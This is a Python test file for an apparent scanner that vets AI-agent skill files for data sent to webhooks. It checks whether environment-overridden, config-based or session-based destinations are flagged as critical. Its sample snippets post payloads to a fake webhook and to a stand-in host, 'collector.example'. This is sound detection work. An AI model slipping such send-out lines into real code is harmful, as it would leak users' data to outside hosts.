"""Batch 6 PR3, KL1 + KL2 (Codex #15 highs 1 and 2) and #15 medium 5: a chat webhook is ISR-T018 only when the code proves it is
where the request goes.

KL1: a lookup's default (os.environ.get('HOOK', URL), getattr, setdefault, pop, fallback=, an unknown or environment-backed
map) is the destination only when the map is proven empty: bound once in the region to {} or dict() and never used anywhere
else. One side of an or / || / conditional, and a name bound twice or used as a lookup's argument, are ISR-T005 (critical).
KL2: `get` is an HTTP GET on a module (requests.get) or on a name the code binds to an HTTP client (s = requests.Session(),
with httpx.Client() as c), never because a name ends in client or session (cfg_client = {} is a map).
Medium 5: the other URLs that make a destination doubtful are those in the code region of the send, not a docs link in the
prose around it.

Tests marked "replay" fail on 1aed58a on their assertion (measured with 1aed58a's watchtower/ sources, this file in place);
"guard" ones keep what must not change. Every URL is an example; the webhook is FAKE."""
import os, subprocess, sys, unittest
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from test_boxes import ROOT
import isr  # noqa: E402
from test_batch4_codex_review3 import Folder, HEAD, HOOK, vet_json
from test_batch5_codex_r2 import rules_of, fenced

COLLECTOR = "https://collector.example"


class UnknownDefaultsAreNotDestinations(Folder):
    CODEX = "requests.post(os.environ.get('HOOK', '" + HOOK + "'), json=payload)"   # Codex's env override
    UNKNOWN = ("config = json.load(open('config.json'))\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)",   # sibling config
               "requests.post(getattr(cfg, 'hook', '" + HOOK + "'), json=payload)",
               "requests.post(cfg.setdefault('hook', '" + HOOK + "'), json=payload)",
               "requests.post(cfg.pop('hook', '" + HOOK + "'), json=payload)",
               "env = dict(os.environ)\nrequests.post(env.get('HOOK', '" + HOOK + "'), json=payload)",                # environment-backed
               "url = '" + HOOK + "'\nurl = os.environ.get('URL', url)\nrequests.post(url, json=payload)",           # reassigned
               "WEBHOOK = '" + HOOK + "'\nrequests.post(os.environ.get('URL', WEBHOOK), json=payload)",               # a lookup's default by name
               "WEBHOOK = '" + HOOK + "'\nrequests.post(os.environ.get('URL') or WEBHOOK, json=payload)",             # one side of an or
               "config = {}\nconfig.update(load())\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)",  # written later
               "config = {}\nload_into(config)\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)",      # passed on
               "config = {}\nconfig = load()\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)",       # bound twice
               "config = {}\nexec(code)\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)")            # names written at run time

    def test_the_codex_env_override_is_critical(self):   # replay (1aed58a: Install with changes, ISR-T018)
        code, r = vet_json(self.write("SKILL.md", fenced(self.CODEX)))
        self.assertEqual(r["verdict"], "Do not install")
        self.assertIn(("ISR-T005", "critical"), [(f["rule"], f.get("severity_was", f["severity"])) for f in r["findings"]])
        self.assertNotIn("ISR-T018", [f["rule"] for f in r["findings"]])

    def test_every_unknown_runtime_destination_is_t005(self):   # replay (1aed58a: ISR-T018 for each)
        for c in self.UNKNOWN:
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)

    def test_the_proven_empty_map_stays_a_chat_webhook(self):   # guard
        # batch 7b: no destination is proven any more; a lookup's default is ISR-T005 (was ISR-T018 for all four)
        for c in ("config = {}\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)",
                  "config = dict()\nrequests.post(config.get(name, '" + HOOK + "'), json=payload)",
                  "config = {}\nurl = config.get('hook', '" + HOOK + "')\nrequests.post(url, json=payload)"):
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)
        self.assertEqual(rules_of(fenced("const config = {}\nfetch(config.get('hook', '" + HOOK + "'), {method: 'POST', body})", "js")), {"ISR-T005"})

    def test_literal_destinations_stay_chat_webhooks(self):   # guard
        self.assertEqual(rules_of(fenced("requests.post('" + HOOK + "', json=payload)")), {"ISR-T018"})
        # batch 7b: a name or an index is never a recognised send's literal (were ISR-T018)
        for c in ("WEBHOOK = '" + HOOK + "'\nrequests.post(WEBHOOK, json=payload)",
                  "WEBHOOK = '" + HOOK + "'\nif ready:\n    requests.post(WEBHOOK, json=payload)",
                  "config = {'hook': '" + HOOK + "'}\nrequests.post(config['hook'], json=payload)"):
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)

    def test_a_key_and_a_config_parser_stay_t005(self):   # guard
        for c in ("config = {}\nrequests.post(config.get('" + HOOK + "', '" + COLLECTOR + "'), json=payload)",
                  "import configparser\ncfg = configparser.ConfigParser()\ncfg.read('settings.ini')\n"
                  "requests.post(cfg.get('chat', 'hook', fallback='" + HOOK + "'), json=payload)"):
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)


class ReceiverIdentity(Folder):
    CFG_CLIENT = "cfg_client = {}\nurl = cfg_client.get('" + HOOK + "', '" + COLLECTOR + "')\nrequests.post(url, json=payload)"   # Codex's

    def test_a_client_suffix_is_not_a_client(self):   # replay (1aed58a: Install with changes, ISR-T018)
        code, r = vet_json(self.write("SKILL.md", fenced(self.CFG_CLIENT)))
        self.assertEqual(r["verdict"], "Do not install")
        self.assertNotIn("ISR-T018", [f["rule"] for f in r["findings"]])
        for c in ("session.get('" + HOOK + "')", "client.get('" + HOOK + "', headers)",
                  "s = requests.Session()\ns = cfg\ns.get('" + HOOK + "')"):   # unbound, or bound twice
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)

    def test_a_session_bound_in_the_code_is_a_client(self):   # replay (1aed58a: Do not install, ISR-T005)
        # batch 7b: a session or client is not requests/httpx/axios itself, so not a recognised send (were ISR-T018)
        for c in ("s = requests.Session()\ns.get('" + HOOK + "')",
                  "with httpx.Client() as c:\n    c.get('" + HOOK + "', params)",
                  "self.http = aiohttp.ClientSession()\nself.http.get('" + HOOK + "')"):
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)

    def test_module_gets_stay_chat_webhooks(self):   # guard
        for lang, c in (("python", "requests.get('" + HOOK + "', params)"), ("python", "httpx.get('" + HOOK + "')")):
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T018"}, c)
        # batch 7b: axios.get takes exactly one argument, and https is not a recognised client (were ISR-T018)
        for lang, c in (("js", "axios.get('" + HOOK + "', config)"), ("js", "https.get('" + HOOK + "', cb)")):
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)


class OtherUrlsInTheSendsRegion(Folder):
    EMPTY = "config = {}\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)"

    def test_a_docs_link_outside_the_code_block_is_not_another_destination(self):   # replay (1aed58a: ISR-T005)
        text = HEAD + "See https://docs.example/help for the setup.\n\n```python\n" + self.EMPTY + "\n```\n"
        self.assertEqual(rules_of(text), {"ISR-T005"})   # batch 7b: the config = {} default is no longer a send (was ISR-T018)

    def test_another_url_inside_the_code_block_still_counts(self):   # guard
        for c in ("API = '" + COLLECTOR + "'\n" + self.EMPTY, "# docs: https://docs.example/help\n" + self.EMPTY):
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)


class Scaling(unittest.TestCase):
    def test_many_lookups_and_uses_stay_linear(self):   # guard (timing: one pass per region, at most 50 uses followed)
        lines = ["config = {}", "WEBHOOK = '" + HOOK + "'"]
        lines += ["requests.post(config.get('k%d', '%s'), json=p)" % (i, HOOK) for i in range(3000)]
        lines += ["requests.post(WEBHOOK, json=p)"] * 3000
        code = ("import sys, time; sys.path.insert(0, %r); import isr\n"
                "t = '---\\nname: x\\ndescription: x\\n---\\n```python\\n' + open(%r).read() + '\\n```\\n'\n"
                "s = time.monotonic(); isr.scan_text(t, '/s/SKILL.md', isr.load_rules()); print(time.monotonic() - s)")
        import tempfile
        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
            f.write("\n".join(lines))
        self.addCleanup(os.remove, f.name)
        p = subprocess.run([sys.executable, "-c", code % (os.path.join(ROOT, "isr_bot"), f.name)], capture_output=True, text=True, timeout=120)
        self.assertEqual(p.returncode, 0, p.stderr[-2000:])
        self.assertLess(float(p.stdout.strip().splitlines()[-1]), 20.0)


if __name__ == "__main__":
    unittest.main()
